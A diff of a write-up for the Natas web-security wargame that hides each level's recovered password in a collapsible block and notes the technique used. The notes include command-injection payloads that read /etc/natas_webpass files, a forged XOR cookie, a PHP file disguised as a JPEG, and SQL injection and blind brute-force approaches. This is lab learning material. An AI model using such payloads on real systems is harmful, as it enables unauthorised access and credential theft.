@@ -1,43 +1,84 @@
 # Natas 2
 
+<details>
+<summary>Password</summary>
+
+```
 username:password
-
 alice:BYNdCesZqW
-
 bob:jw2ueICLvT
-
 charlie:G5vCxkVV3m
-
 natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
-
 eve:zo4mJWyNj2
-
 mallory:9urtcpzBmH
+```
+
+</details>
+<br/>
 
 
 # Natas 3
-`natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
+
+<details>
+<summary>Password</summary>
+
+```
+natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+```
+
+</details>
+<br/>
 
 
 # natas 5
+<details>
+<summary>Password</summary>
+
 ```
 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 
 bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk
 ```
 
+</details>
+<br/>
+
 # natas 6
 `$secret = FOEIUWGHFEEUHOFUOIU`
 
+<details>
+<summary>Password</summary>
+
+```
 Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+```
+
+</details>
+<br/>
 
 # natas 7
-`xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
+<details>
+<summary>Password</summary>
+
+```
+xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+```
+
+</details>
+<br/>
 
 # natas 8
 `$secret = oubWYf2kBq`
 
+<details>
+<summary>Password</summary>
+
+```
 Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+```
+
+</details>
+<br/>
 
 
 # natas 9
@@ -45,7 +86,15 @@ easy passthru() argument hijacking
 
 `fff /; cat /etc/natas_webpass/natas10; echo` 
 
-`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
+<details>
+<summary>Password</summary>
+
+```
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+```
+
+</details>
+<br/>
 
 
 # natas 10
@@ -53,7 +102,15 @@ still easy passthru() argument hijacking
 
 `^ /etc/natas_webpass/natas11 \\ echo`
 
-`/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
+<details>
+<summary>Password</summary>
+
+```
+/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+```
+
+</details>
+<br/>
 
 
 # natas 11
@@ -67,7 +124,15 @@ Note: XOR key is the repeatable part
 
 `document.cookie = "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5"`
 
-`The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
+<details>
+<summary>Password</summary>
+
+```
+The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+```
+
+</details>
+<br/>
 
 
 # natas 12
@@ -82,7 +147,15 @@ echo $file;
 ?>
 ```
 
-`trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
+<details>
+<summary>Password</summary>
+
+```
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+```
+
+</details>
+<br/>
 
 
 # natas 13 
@@ -95,7 +168,15 @@ can be easily overwritten with xxd.
 
 with this we have a php file that has a signature of a JPEG file.
 
+<details>
+<summary>Password</summary>
+
+```
 z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+```
+
+</details>
+<br/>
 
 
 # natas 14
@@ -108,7 +189,15 @@ a very simple SQL Injection
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
 ```
 
+<details>
+<summary>Password</summary>
+
+```
 Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+```
+
+</details>
+<br/>
 
 
 # natas 15 
@@ -129,7 +218,15 @@ SELECT * from users where username="natas16" AND password LIKE BINARY "test%"
 of course this can take a long time so we will be automating that with a simple Python script ( sql_password_guesser.py )
 
 
+<details>
+<summary>Password</summary>
+
+```
 Recovered password (partial if interrupted): hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+</details>
+<br/>
 
 
 # natas 16 
@@ -182,7 +279,15 @@ grep -i "$(grep ^abc /etc/natas_webpass/natas17)" dictionary.txt
 
 we definitely need python for that, script name is grep-guesser.py
 
-`[.] Recovered Password:  EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
+<details>
+<summary>Password</summary>
+
+```
+[.] Recovered Password:  EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+```
+
+</details>
+<br/>
 
 
 # natas 17
@@ -233,7 +338,15 @@ adding a time checker:
 ```
 
 
+<details>
+<summary>Password</summary>
+
+```
 Recovered password (partial if interrupted): 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+```
+
+</details>
+<br/>
 
 
 # natas 18
